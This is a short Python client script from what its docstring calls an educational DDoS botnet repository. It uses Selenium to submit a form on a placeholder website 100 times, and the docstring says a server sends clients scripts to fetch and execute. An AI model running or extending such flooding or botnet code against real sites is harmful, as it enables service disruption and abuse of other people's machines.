'''
    This script is responsible for simulating a client in a DDoS (Distributed Denial of Service) botnet.
    It repeatedly sends requests to a specified webpage, emulating a coordinated DDoS attack.

    This botnet learning repository includes the following files:

    - client.py: The main file executed on all the clients, responsible for executing the code in unison and 
                 sending messages to the webpage over and over.

    - server.py: The server application responsible for orchestrating the botnet and sending commands to the clients.
                 It sends instructions to the clients, such as fetching and executing scripts.

    - file.py:   The Python script to be executed on the clients upon receiving commands from the server. This script
                 carries out the desired actions on the client machine, simulating the behavior of a botnet.

    For educational purposes only. Any misuse of the provided code is strictly prohibited.
'''

# Selenium Imports
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Webdriver Imports
from webdriver_manager.chrome import ChromeDriverManager

# Time Import
import time

# Set up the webdriver (using chrome for thi)
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

try:
    # Link to the site
    driver.get('https://website.xyz')

    # Allow the page to load (could be lesser)
    wait = WebDriverWait(driver, 20)

    # number of iterations
    for i in range(100):
        # create a print in console
        print(f"Iteration {i+1}:")

        # Locate the input box using #id
        # input_box = driver.find_element(By.ID, 'input-box-id')

        # If no id then placeholders can be used as well
        # Wait for the input box to be present
        input_box = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[placeholder="placeholder-text-here"]')))

        # Type "text" into the input box
        input_box.clear()
        input_box.send_keys('text')

        # Locate the button and click it 
        # button = driver.find_element(By.ID, 'button-id')  

        # Wait for the button to be clickable and get it by using the text of it
        button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[text()="Button Text"]')))
        button.click()


        # Allow some time to observe the result
        # time.sleep(1)

except Exception as e:
    print(f"An error occurred: {e}")

finally:
    # Close the browser
    driver.quit()